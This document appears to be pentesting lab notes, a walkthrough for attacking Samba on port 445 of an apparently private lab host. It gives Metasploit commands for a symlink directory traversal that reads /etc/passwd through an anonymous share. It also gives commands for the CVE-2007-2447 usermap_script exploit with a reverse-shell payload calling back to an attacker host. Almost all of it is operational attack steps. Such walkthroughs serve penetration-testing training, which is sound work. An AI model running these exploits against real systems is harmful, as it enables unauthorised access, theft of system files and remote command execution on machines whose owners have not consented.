
## Port 445 | netbios-ssn (Samba)

https://www.youtube.com/watch?v=YkXUrPu7sPc

### Attack Vector #1 

OSVDB-62145

Samba Symlink Directory Traversal

1. Check to see if Samba is configured with a writeable file share
```
# smbclient -L //192.168.50.7  (press Enter to use anonymous access)

(press Enter to use anonymous access)
```
2. Create a new directory and link it to the root filesystem on victim machine
```
> use auxiliary/admin/smb/samba_symlink_traversal
> set rhost 192.168.50.7
> set smbshare tmp
> set smbtarget new_root_victim

> exploit
```
3. Access to the root filesystem using an anonymous connection
```
# smbclient //192.168.50.7/tmp  (press Enter to use anonymous access)
```
List directory contents
> smb: \> ls

Access to the newly created directory (linked to the root filesystem)
> smb: \> cd new_root_victim

Read passwd file
> smb: \new_root_victim\> more /etc/passwd

### Attack Vector #2 

1. We use an auxiliary module to get info about the SMB version
```
> use auxiliary/scanner/smb/smb_version
> set rhosts 192.168.50.7

> run
```
> [*] 192.168.50.7:445 - Host could not be identified: Unix (Samba 3.0.20-Debian)

2. With the above information (Samba 3.0.20-Debian), we can now use a suitable exploit against the target

CVE-2007-2447

Samba "username map script" Command Execution
```
> use exploit/multi/samba/usermap_script
> set rhost 192.168.50.7

> set payload cmd/unix/reverse
> set lhost 192.168.50.6

> exploit

id
ifconfig
```


